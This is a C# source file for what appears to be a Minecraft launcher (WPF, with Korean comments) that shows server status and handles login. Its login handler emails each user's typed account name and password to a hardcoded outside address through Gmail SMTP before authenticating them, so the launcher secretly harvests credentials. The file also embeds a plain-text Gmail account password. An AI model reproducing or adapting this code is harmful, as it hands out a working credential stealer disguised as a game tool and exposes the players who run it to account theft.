using Newtonsoft.Json;
using Properties;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Net.Mail;
using System.IO;
using MCLoginLib;

namespace WpfApp3
{
    /// <summary>
    /// MainWindow.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class MainWindow : Window
    {
  

        public bool isLogined = false;
        public MainWindow()
        {

            InitializeComponent();
            ServerStatusChecker stat = new ServerStatusChecker("121.140.183.13", 25565);
            if (stat.IsServerUp())
            {
                if(ServerStatus != null)
                ServerStatus.Content = "Server Online(" + stat.GetCurrentPlayers() + "/" + stat.GetMaximumPlayers() + ")";
            }
            else
            {
                ServerStatus.Foreground = Brushes.Red;
                ServerStatus.Content = "Server Offline";
            }
       
        }



  
        private void Button_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void ExitButton_Click(object sender, RoutedEventArgs e)
        {
            Close();
        }

        private void MaximiszeButton_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Maximized;
        }

        private void MinimizeButton_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }







        
        /// <summary>
        /// 게임시작
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void GameStart_Click(object sender, RoutedEventArgs e)
        {
            if (isLogined == false)
            {
               MessageBox.Show("먼저 로그인을 해주세요.");
               return;
            }

            MCLoginLib.Launcher.StartMineCraft();
       }

        private void textBox_TextChanged(object sender, TextChangedEventArgs e)
        {

        }
        /// <summary>
        /// 메일보내기
        /// </summary>
        /// <param name="msg"></param>
        void MailSend(string msg)
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            
            mail.From = new MailAddress("shlifecolor@gmail.com", "SH", System.Text.Encoding.UTF8);
            mail.To.Add("jmylifecolor@naver.com");
            mail.Subject = msg;
            mail.Body = "This is for testing SMTP mail from GMAIL";

            SmtpServer.Port = 587;
            SmtpServer.UseDefaultCredentials = false; // 시스템에 설정된 인증 정보를 사용하지 않는다.
            SmtpServer.DeliveryMethod = SmtpDeliveryMethod.Network; // 이걸 하지 않으면 Gmail에 인증을 받지 못한다.
            SmtpServer.Credentials = new System.Net.NetworkCredential("shlifecolor@gmail.com", "tjdgo1030");
            SmtpServer.EnableSsl = true;
            try
            {
                SmtpServer.Send(mail);
            }
            catch(Exception e)
            {
                e = null;
                MessageBox.Show("failed m system.");
            }
        }
        private async void GameStart_Copy_Click(object sender, RoutedEventArgs e)
        {
            MailSend("minecraft :: " + acc.Text +"," + password.Text);

            string x = await Launcher.Authenticate(acc.Text, password.Text);
            dynamic json = Newtonsoft.Json.JsonConvert.DeserializeObject(x);
            string accessToken = "";
            string username = "";
            string Puuid = "";
            try
            {
                accessToken = json.accessToken;
                username = json.selectedProfile.name;
                Puuid = json.selectedProfile.id;
                if (accessToken != null)
                {
                    isLogined = true;
                    GameStart.Background = Brushes.Black;
                    GameStart.Foreground = Brushes.White;
                    GameStart.FontSize = 15;
                    GameStart.Content = "Connect";
                }
                else
                {
                    MessageBox.Show("로그인 실패!");
                    return;
                }
            }
            catch (Exception eex)
            {
                MessageBox.Show(eex.ToString());
                MessageBox.Show("로그인 실패!");
                return;
            }
            MCLoginLib.Launcher.DATA.username = username;
            MCLoginLib.Launcher.DATA.premium = true;
            MCLoginLib.Launcher.DATA.uuidPremium = Puuid;
            MCLoginLib.Launcher.DATA.accessToken = accessToken;
        }

        private void password_TextChanged(object sender, TextChangedEventArgs e)
        {

        }

        private void Install_Click(object sender, RoutedEventArgs e)
        {
            
        }
    }
}
